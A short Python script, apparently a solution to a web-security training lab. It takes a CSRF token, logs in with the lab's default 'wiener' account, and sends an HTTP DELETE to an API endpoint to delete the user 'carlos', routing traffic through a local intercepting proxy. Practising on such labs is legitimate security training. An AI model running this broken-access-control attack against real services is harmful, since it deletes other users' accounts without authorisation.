import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies_setting = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session,url_login,username):
    
    response = session.get(url_login,verify=False,proxies=proxies_setting)
    soup = BeautifulSoup(response.text,'html.parser')
    csrf = soup.find('input',{'name': 'csrf'})['value']
    print(f"(+) Token del usuario {username} encontrado: {csrf}")
    return csrf
    

def login_user(session,base_url,username,password):
    url_login = f"{base_url}/login"
    print("(+) Obtenidendo el token de session...")
    csrf = get_csrf_token(session,url_login,username)
    params = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    response = session.post(url_login,data=params,verify=False,proxies=proxies_setting)
    if "Your username is: wiener" in response.text:
        print(f"(+) Login user {username} OK")
        return True
    else:
        print(f"(-) Login fallido")
        return False

def delete_user(session,base_url):
    payload = f"{base_url}/api/user/carlos"
    response = session.delete(payload,verify=False,proxies=proxies_setting)
    if "User deleted" in response.text:
        print(f"(+) Usuario carlos eliminado")
    else:
        print("(-) Usuario no eliminado")

def main():
    if len(sys.argv) !=2:
        print(f"(+) Uso: {sys.argv[0]} http://ejemplo.com")
        exit(-1)

    session = requests.session()
    url_base = sys.argv[1]
    
    login = login_user(session,url_base,"wiener","peter")
    if login:
        print(f"(+) Intentando eliminar el usuario carlos...")
        delete_user(session,url_base)

if __name__ == "__main__":
    main()